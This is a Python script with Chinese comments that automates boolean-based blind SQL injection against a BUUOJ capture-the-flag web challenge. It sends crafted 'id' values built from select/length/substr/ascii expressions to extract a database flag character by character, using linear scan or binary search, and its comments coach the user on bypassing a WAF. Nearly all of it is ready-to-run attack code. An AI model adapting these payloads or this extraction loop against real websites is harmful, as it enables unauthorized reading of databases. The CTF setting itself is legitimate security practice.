import requests
import time
import string

# --- 用户配置开始 ---
TARGET_URL = "http://428aadb2-5f2e-4b54-a9cd-bbd042fa4ca0.node5.buuoj.cn:81/index.php"
METHOD = "POST"

# 现在，ID_PAYLOAD_WRAPPER 直接使用 sql_condition 的结果作为 id 的值
# sql_condition 本身必须是一个WAF安全的SQL表达式，
# 该表达式根据内部逻辑的真假，计算得出或选择出最终的id字符串 (如 "1" 或 "0")
ID_PAYLOAD_WRAPPER = "{sql_condition_produces_final_id_string}"

TRUE_RESPONSE_MARKER = "Hello, glzjin wants a girlfriend."
FALSE_RESPONSE_MARKER = "Error Occured When Fetch Result." # "0", "*", "-", "=", "' 'sleep 50'", "@variable" 都会导致这个

DATA_TEMPLATE = "id={payload_value}"

HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# --- 【【【极其重要的部分：WAF绕过的SQL注入逻辑】】】 ---
# 你【必须】用【能够实际绕过WAF和bool(false)过滤的、有效的SQL表达式】替换它们！
# 这些表达式在执行后，需要得到可以直接作为 id 参数值的字符串，例如 "1" 或 "0"。

# 用于获取flag长度的SQL表达式模板。
# 当 (实际flag长度 == {length}) 时，此表达式计算结果为 1 (真)。
# 当 (实际flag长度 != {length}) 时，此表达式计算结果为 0 (假)。
# 【【你需要用不被WAF拦截的SQL逻辑替换这里的示例】】
SQL_LENGTH_CHECK_EXPRESSION = "((select(length(flag))from(flag))={length})" # <<--- 【【【替换! (如果select, length, from等仍有问题)】】】

# 用于获取flag中特定位置字符的ASCII值的SQL表达式模板 (用于线性扫描)。
# 当 (实际flag中pos位置字符的ASCII == {char_ascii}) 时，此表达式计算结果为 1 (真)。
# 当 (实际flag中pos位置字符的ASCII != {char_ascii}) 时，此表达式计算结果为 0 (假)。
# 【【你需要用不被WAF拦截的SQL逻辑替换这里的示例】】
SQL_CHAR_CHECK_EXPRESSION = "((ascii(substr((select(flag)from(flag)),{pos},1))={char_ascii}))" # <<--- 【【【替换! (如果select, substr, ascii等仍有问题)】】】

# （可选）用于二分法获取字符的SQL表达式模板。
# 这个条件需要判断 (实际ASCII值 > {char_to_compare})。
# 如果为真，表达式计算结果为1；如果为假，表达式计算结果为0。
# 【【你需要用不被WAF拦截的SQL逻辑替换这里的示例】】
SQL_CHAR_CHECK_EXPRESSION_FOR_BINARY = "((ascii(substr((select(flag)from(flag)),{pos},1))>{char_to_compare}))" # <<--- 【【【替换! (如果select, substr, ascii等仍有问题)】】】

CHARSET = "".join(chr(i) for i in range(32, 127))
MAX_FLAG_LENGTH = 60
REQUEST_DELAY = 0.2
# --- 用户配置结束 ---

s = requests.Session()
s.headers.update(HEADERS)

def make_request_and_check(final_id_value_to_send):
    """
    直接使用最终构造好的id参数值发送请求，并检查响应。
    """
    data_to_send_dict = {}
    if '{payload_value}' in DATA_TEMPLATE :
        # This part might need simplification if final_id_value_to_send IS the payload_value
        param_key = DATA_TEMPLATE.split("=")[0] # Assuming simple "key={payload_value}"
        data_to_send_dict[param_key] = final_id_value_to_send
    else: # If DATA_TEMPLATE itself IS the payload string (e.g. from SQL expression)
        # This branch is unlikely if DATA_TEMPLATE is "id={payload_value}"
        # Assuming final_id_value_to_send is what we want for the id param's value
        param_key = "id" # Default or extract from DATA_TEMPLATE
        if "=" in DATA_TEMPLATE: param_key = DATA_TEMPLATE.split("=")[0]
        data_to_send_dict[param_key] = final_id_value_to_send


    try:
        if METHOD.upper() == "POST":
            response = s.post(TARGET_URL, data=data_to_send_dict, timeout=15)
        elif METHOD.upper() == "GET":
            response = s.get(TARGET_URL, params=data_to_send_dict, timeout=15)
        else:
            print(f"[!] 不支持的HTTP方法: {METHOD}")
            return None

        response.raise_for_status()
        # print(f"    [Debug] Sent ID: {final_id_value_to_send}, Resp Len: {len(response.text)}, Sample: {response.text[:100]}")

        if TRUE_RESPONSE_MARKER in response.text:
            if FALSE_RESPONSE_MARKER and FALSE_RESPONSE_MARKER in response.text:
                print(f"    [Warning] 真假标记同时存在于响应中! Sent ID: {final_id_value_to_send}")
                return None
            return True # 条件为真
        elif FALSE_RESPONSE_MARKER and FALSE_RESPONSE_MARKER in response.text:
            return False # 条件为假
        else:
            # print(f"    [Warning] 响应中未找到明确的真或假标记. Sent ID: {final_id_value_to_send}")
            # print(f"    [Debug] Response Sample: {response.text[:200]}")
            return None

    except requests.exceptions.Timeout:
        print(f"[!] 请求超时: (Sent ID: {final_id_value_to_send})")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求异常: {e} (Sent ID: {final_id_value_to_send})")
        return None
    finally:
        time.sleep(REQUEST_DELAY)

def get_flag_length():
    print("[+] 正在获取flag长度...")
    for length in range(1, MAX_FLAG_LENGTH + 1):
        # SQL_LENGTH_CHECK_EXPRESSION 现在需要直接产生 "1" 或 "0" (或其他目标ID字符串)
        final_id_to_send = SQL_LENGTH_CHECK_EXPRESSION.format(length=length)
        print(f"    [*] 尝试长度: {length} (Generated ID: {final_id_to_send[:100]})", end='\r')

        result = make_request_and_check(final_id_to_send)

        if result is True: # 得到真响应，说明SQL表达式生成了"1" (或"2")
            print(f"\n[+] Flag 长度确定为: {length}")
            return length
        elif result is None:
            print(f"\n    [!] 无法确定长度 {length} 的状态。停止长度探测。")
            return None
    print(f"\n[!] 未能在1到{MAX_FLAG_LENGTH}之间找到flag长度。")
    return None

def get_flag_character_linear_scan(position, min_ascii=32, max_ascii=126):
    print(f"    [*] 正在获取位置 {position} 的字符 (线性扫描)...")
    for char_code in range(min_ascii, max_ascii + 1):
        final_id_to_send = SQL_CHAR_CHECK_EXPRESSION.format(pos=position, char_ascii=char_code)
        print(f"        [*] 尝试字符: {chr(char_code)} (ASCII: {char_code}) at pos {position} (Gen ID: {final_id_to_send[:100]})", end='\r')

        result = make_request_and_check(final_id_to_send)
        if result is True:
            print(f"\n    [+] 位置 {position} 找到字符: '{chr(char_code)}' (ASCII: {char_code})")
            return chr(char_code)
        elif result is None:
             print(f"\n    [!] 无法确定字符 {chr(char_code)} 在位置 {position} 的状态。停止此字符探测。")
             return None
    print(f"\n    [!] 未能在位置 {position} 找到字符 (ASCII范围 {min_ascii}-{max_ascii})。")
    return None

def get_flag_character_binary_search(position, min_ascii=32, max_ascii=126):
    print(f"    [*] 正在获取位置 {position} 的字符 (二分法)...")
    # SQL_CHAR_CHECK_EXPRESSION_FOR_BINARY 设计为：
    # 当 (真实ASCII > char_to_compare) SQL条件为【真】时，它应生成能触发 FALSE_RESPONSE_MARKER 的ID (例如 "0")。
    # 当 (真实ASCII > char_to_compare) SQL条件为【假】时，它应生成能触发 TRUE_RESPONSE_MARKER 的ID (例如 "1")。

    ans = -1  # 用于存储最终确定的ASCII码
    low = min_ascii
    high = max_ascii

    while low <= high:
        mid = low + (high - low) // 2
        # 构造用于比较 (真实ASCII > mid) 的SQL payload
        # 这个payload应该在 (真实ASCII > mid) 为真时，导致服务器返回“假响应”
        # 在 (真实ASCII > mid) 为假时，导致服务器返回“真响应”
        final_id_to_send = SQL_CHAR_CHECK_EXPRESSION_FOR_BINARY.format(pos=position, char_to_compare=mid)
        
        # 增加临时调试信息，看payload和收到的result
        # print(f"\n        [Debug] Testing: (ASCII > {mid}) | low={low}, high={high}, mid={mid} | Payload='{final_id_to_send[:100]}...' | ", end='')
        print(f"        [*] 二分: low={low}, high={high}, mid={mid}, testing (ASCII > {mid}) (Gen ID: {final_id_to_send[:100]})", end='\r')


        result = make_request_and_check(final_id_to_send)
        # print(f"Got result: {result}") # 打印实际的 True/False/None

        if result is False:  # 服务器返回“假”响应 (e.g., Error Occured)
                             # 根据SQL设计，这意味着 (真实ASCII > mid) 为【真】
            low = mid + 1
        elif result is True: # 服务器返回“真”响应 (e.g., Hello, glzjin)
                             # 根据SQL设计，这意味着 (真实ASCII > mid) 为【假】 (即 真实ASCII <= mid)
            ans = mid        # mid 是一个潜在的答案，或者答案比 mid 更小
            high = mid - 1
        elif result is None: # 请求失败或响应不明确
            print(f"\n    [!] 二分法在位置 {position}, mid {mid} 处请求失败或响应不明确。")
            return None
    
    # 循环结束后, ans 中应该保存了满足 ASCII <= mid 条件的最小的 mid (即实际的ASCII值)
    # 或者说，low 应该是 ASCII值 + 1 (如果最后一步是low=mid+1) 或者 low 就是ASCII值 (如果最后一步是ans=mid, high=mid-1, 然后low=high+1)
    # 此时，ans 变量中存储的是最后一次 (ASCII > mid) 被判断为假时 (即 ASCII <= mid 时) 的 mid 值。
    # 这个值应该是我们要找的精确ASCII码。

    if ans != -1: # 如果 ans 被更新过 (即至少有一次 result is True 的情况)
        # print(f"\n        [*] 二分法初步候选ASCII: {ans} ({chr(ans)}). 进行精确验证...")
        # 使用线性扫描的精确匹配表达式进行验证
        final_id_to_send_exact = SQL_CHAR_CHECK_EXPRESSION.format(pos=position, char_ascii=ans)
        exact_result = make_request_and_check(final_id_to_send_exact)
        
        if exact_result is True: # 精确验证成功
             print(f"\n    [+] 位置 {position} 找到字符: '{chr(ans)}' (ASCII: {ans})")
             return chr(ans)
        else: # 精确验证失败
             print(f"\n    [!] 二分法找到的候选值 {chr(ans)} (ASCII: {ans}) 未通过精确验证 (验证时响应为: {exact_result})。")
             print(f"    [!] 这可能意味着 SQL_CHAR_CHECK_EXPRESSION_FOR_BINARY 的逻辑或WAF处理与 SQL_CHAR_CHECK_EXPRESSION 有差异，")
             print(f"    [!] 或者字符集中不存在该字符，或者 'make_request_and_check' 对某些payload的判断不稳定。")
             return None
    else: # ans 从未被更新，说明 result is True 从未发生，即 (ASCII > mid) 对于所有 mid 都为真（或导致假响应）。
          # 这通常意味着实际的ASCII值大于了搜索范围的上限，或者 (ASCII > mid) 的判断逻辑始终导致“假响应”。
        print(f"\n    [!] 未能在位置 {position} 二分查找到字符 (ans remained -1)。low={low}, high={high}")
        print(f"    [!] 这表明对于所有尝试的mid值，(ASCII > mid) 条件都表现为真（或导致了服务器的“假响应”）。")
        print(f"    [!] 请检查 SQL_CHAR_CHECK_EXPRESSION_FOR_BINARY 的逻辑以及实际字符是否在 [{min_ascii}-{max_ascii}] 范围内。")
        return None
def get_flag(flag_length, use_binary_search=False):
    # (与上一版脚本的 get_flag 函数相同，此处略去以节省空间，请参考上一版)
    print(f"[+] 开始获取flag (长度: {flag_length})...")
    flag = ""
    for i in range(1, flag_length + 1):
        char_found = None
        if use_binary_search:
            print(f"    [Info] 使用二分法获取位置 {i} 的字符。确保 SQL_CHAR_CHECK_EXPRESSION_FOR_BINARY 和 SQL_CHAR_CHECK_EXPRESSION 配置正确。")
            char_found = get_flag_character_binary_search(i, min_ascii=ord(CHARSET[0]), max_ascii=ord(CHARSET[-1]))
        else:
            char_found = get_flag_character_linear_scan(i, min_ascii=ord(CHARSET[0]), max_ascii=ord(CHARSET[-1]))

        if char_found:
            flag += char_found
            # print(f"    [*] 当前Flag: {flag}...") # 避免被 \r 覆盖
        else:
            print(f"[!] 获取位置 {i} 的字符失败。")
            flag += "?"
    return flag


if __name__ == "__main__":
    print("[+] Boolean-Based Blind SQL Injection Script (v2 - Direct ID String Generation)")
    print(f"[+] 目标 URL: {TARGET_URL}")
    print(f"[+] ID Payload Wrapper (conceptual): id={{your_waf_safe_sql_expr_producing_final_id_string}}")
    print(f"[+] 真条件响应标记: '{TRUE_RESPONSE_MARKER}'")
    print(f"[+] 假条件响应标记: '{FALSE_RESPONSE_MARKER}'")
    print("="*80)
    print("【【【【【【【【【【【【【【【【【【【【【警告】】】】】】】】】】】】】】】】】】】】】")
    print("由于 '1-0' 被WAF拦截，之前的 ID_PAYLOAD_WRAPPER = \"1-({sql_condition})\" 可能已失效。")
    print("现在，脚本中的 SQL_LENGTH_CHECK_EXPRESSION, SQL_CHAR_CHECK_EXPRESSION, 和 ")
    print("SQL_CHAR_CHECK_EXPRESSION_FOR_BINARY 占位符代表的【必须是完整的、WAF安全的SQL表达式】，")
    print("这些表达式在执行后需要【直接计算出或选择出最终的id字符串】(例如 \"1\" 或 \"0\")。")
    print("这比之前仅返回0或1给包装器处理要【困难得多】。")
    print("你【必须】根据你对目标WAF和应用过滤逻辑的分析结果，用你发现的")
    print("【【【能够实际绕过WAF和bool(false)过滤的、有效的SQL表达式】】】替换它们！")
    print("没有正确的WAF绕过SQL逻辑，此脚本无法工作。")
    print("="*80)

    flag_len = get_flag_length()

    if flag_len:
        USE_BINARY_SEARCH = False # <<--- 修改为 True 以尝试二分法
        if USE_BINARY_SEARCH:
            print("[+] 将尝试使用【二分法】获取字符。")
        else:
            print("[+] 将尝试使用【线性扫描】获取字符。")
            
        final_flag = get_flag(flag_len, use_binary_search=USE_BINARY_SEARCH)
        
        if final_flag:
            if "?" in final_flag:
                print(f"\n[!] 获取Flag部分成功，但有未知字符: {final_flag}")
            else:
                print(f"\n[SUCCESS] 最终 Flag: {final_flag}")
        else:
            print("\n[!] 获取Flag失败。")
    else:
        print("\n[!] 获取Flag长度失败。")